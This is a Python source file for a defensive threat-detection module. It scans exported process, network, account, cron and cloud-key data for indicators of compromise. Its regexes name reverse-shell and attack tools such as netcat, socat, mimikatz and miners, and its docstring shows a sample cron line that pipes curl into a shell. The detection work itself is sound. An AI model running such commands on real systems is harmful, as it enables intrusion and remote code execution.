#!/usr/bin/env python3
"""
threat_detection/detector.py — indicator classification + IOC analysis.

Two jobs:
  1. classify()  — bucket existing findings into VULNERABILITY / MISCONFIGURATION
     / THREAT_INDICATOR / ACTIVE_COMPROMISE_INDICATOR for the report.
  2. analyze_input() — ingest an authorized host/cloud data export (processes,
     accounts, cron/systemd, listening sockets, IAM keys) plus optional IOC feeds
     (bad hashes/domains/IPs) and surface suspicious items.

Safety: this is read-only analysis of data YOU provide from systems you're
authorized to inspect. It never touches a live host. It never concludes
"compromised" from a single weak signal — active-compromise requires a strong
match (e.g. a known-malicious hash/C2 IP) and is always framed for investigation.
"""

from __future__ import annotations

import json
import re

from core.findings import Finding

# indicator categories
VULNERABILITY = "vulnerability"
MISCONFIGURATION = "misconfiguration"
THREAT_INDICATOR = "threat_indicator"
ACTIVE_COMPROMISE = "active_compromise_indicator"

# heuristics for "suspicious" (weak signals -> THREAT_INDICATOR, never compromise)
_SUSPICIOUS_PROC = re.compile(
    r"\b(nc|ncat|netcat|socat|/tmp/[\w.\-]+|xmrig|minerd|kworker[a-z0-9]{3,}|"
    r"base64\s+-d|python\s+-c\s+.*socket|powershell.*-enc|mimikatz)\b", re.I)
_SUSPICIOUS_PATHS = ("/tmp/", "/dev/shm/", "/var/tmp/")
_PERSIST_HINT = re.compile(r"(curl|wget).+(sh|bash)|reverse.?shell|/etc/cron|@reboot", re.I)


def classify(findings) -> dict:
    """Group findings by indicator category for the report."""
    buckets = {VULNERABILITY: [], MISCONFIGURATION: [], THREAT_INDICATOR: [], ACTIVE_COMPROMISE: []}
    for f in findings:
        kind = getattr(f, "kind", "vulnerability")
        if kind in buckets:
            buckets[kind].append(f)
        else:
            buckets[VULNERABILITY].append(f)
    return {k: len(v) for k, v in buckets.items()}


def _f(fid, title, sev, kind, evidence, attack, patch, mitre=None):
    return Finding(id=fid, title=title, severity=sev, kind=kind,
                   confidence="medium_confidence" if kind == THREAT_INDICATOR else "high_confidence",
                   validation="detected", evidence=evidence[:400],
                   description=title, attack=attack, patch=patch,
                   cwe="CWE-506" if kind != MISCONFIGURATION else "CWE-16",
                   owasp="A09:2021 Security Logging & Monitoring Failures",
                   mitre=mitre or [])


def analyze_input(data: dict, iocs: dict | None = None) -> list[Finding]:
    """
    data (from an authorized export), any subset of:
      processes:        [{"pid":..,"cmd":".."}]
      accounts:         [{"name":..,"uid":0,"privileged":true,"unexpected":true}]
      listening:        [{"proto":"tcp","laddr":"0.0.0.0:4444","proc":".."}]
      scheduled:        ["/etc/cron.d/evil: * * * * root curl http://x|sh", ...]
      connections:      [{"raddr":"1.2.3.4:443","proc":".."}]
      access_keys:      [{"id":"AKIA..","age_days":900,"last_used":null,"admin":true}]
    iocs (optional): {"hashes":[...],"domains":[...],"ips":[...]}
    """
    out: list[Finding] = []
    iocs = iocs or {}
    bad_ips = set(iocs.get("ips", []))
    bad_domains = set(iocs.get("domains", []))
    bad_hashes = set(h.lower() for h in iocs.get("hashes", []))

    # processes
    for p in data.get("processes", []):
        cmd = p.get("cmd", "")
        h = (p.get("sha256") or "").lower()
        if h and h in bad_hashes:
            out.append(_f("threat.malicious_process",
                          "Process matches a known-malicious hash", "critical", ACTIVE_COMPROMISE,
                          f"pid {p.get('pid')}: {cmd} (sha256 in IOC feed)",
                          "A binary matching a known-bad hash is running — strong indicator of active compromise; "
                          "isolate and investigate immediately.",
                          "Isolate the host, preserve forensics, hunt for persistence, rotate credentials.",
                          ["T1059"]))
        elif _SUSPICIOUS_PROC.search(cmd):
            out.append(_f("threat.suspicious_process",
                          "Suspicious process command line", "medium", THREAT_INDICATOR,
                          f"pid {p.get('pid')}: {cmd}",
                          "Command line resembles tooling used by attackers (reverse shells, miners, LOLBins). "
                          "Investigate provenance — this alone is not proof of compromise.",
                          "Verify the process is expected; if not, contain and investigate.",
                          ["T1059"]))

    # network connections to known-bad infra
    for c in data.get("connections", []):
        raddr = c.get("raddr", "")
        ip = raddr.split(":")[0]
        host = c.get("host", "")
        if ip in bad_ips or host in bad_domains:
            out.append(_f("threat.c2_connection",
                          "Connection to known-malicious infrastructure", "critical", ACTIVE_COMPROMISE,
                          f"{c.get('proc','?')} -> {raddr or host} (in IOC feed)",
                          "An outbound connection to a known C2/malicious endpoint is a strong compromise indicator.",
                          "Block the destination, isolate the host, and investigate the responsible process.",
                          ["T1071"]))

    # listening sockets on suspicious ports
    for l in data.get("listening", []):
        laddr = l.get("laddr", "")
        if re.search(r":(4444|1337|31337|9001|12345)$", laddr):
            out.append(_f("threat.suspicious_listener",
                          "Listener on a commonly-malicious port", "medium", THREAT_INDICATOR,
                          f"{l.get('proc','?')} listening {laddr}",
                          "Ports like 4444/1337 are default handler ports for common offensive tooling. Investigate.",
                          "Confirm the service is expected; close/firewall if not.",
                          ["T1571"]))

    # accounts
    for a in data.get("accounts", []):
        if a.get("unexpected") and (a.get("privileged") or a.get("uid") == 0):
            out.append(_f("threat.unexpected_admin",
                          "Unexpected privileged account", "high", THREAT_INDICATOR,
                          f"account {a.get('name')} (uid={a.get('uid')}, privileged)",
                          "An unrecognized admin/root account may be an attacker-created backdoor.",
                          "Verify ownership; disable/remove if unauthorized; review auth logs.",
                          ["T1136"]))

    # scheduled tasks / persistence
    for s in data.get("scheduled", []):
        if _PERSIST_HINT.search(str(s)):
            out.append(_f("threat.persistence",
                          "Suspicious scheduled task / persistence", "high", THREAT_INDICATOR,
                          str(s),
                          "A cron/systemd entry that downloads+executes code is a common persistence mechanism.",
                          "Validate the task; remove unauthorized persistence; investigate how it was added.",
                          ["T1053"]))

    # cloud access keys
    for k in data.get("access_keys", []):
        problems = []
        if k.get("age_days", 0) > 365:
            problems.append(f"age {k['age_days']}d")
        if k.get("last_used") in (None, "", "never"):
            problems.append("never used")
        if k.get("admin"):
            problems.append("admin-privileged")
        if problems:
            out.append(_f("threat.risky_access_key",
                          "Risky/stale cloud access key", "medium", MISCONFIGURATION,
                          f"key {k.get('id','?')}: {', '.join(problems)}",
                          "Old, unused, or over-privileged access keys expand the blast radius if leaked.",
                          "Rotate/remove stale keys, scope permissions, and prefer short-lived credentials.",
                          ["T1078"]))
    return out


def load_and_analyze(path: str, ioc_path: str | None = None) -> list[Finding]:
    try:
        with open(path, "r") as fh:
            data = json.load(fh)
    except Exception:
        return []
    iocs = None
    if ioc_path:
        try:
            with open(ioc_path, "r") as fh:
                iocs = json.load(fh)
        except Exception:
            iocs = None
    return analyze_input(data, iocs)
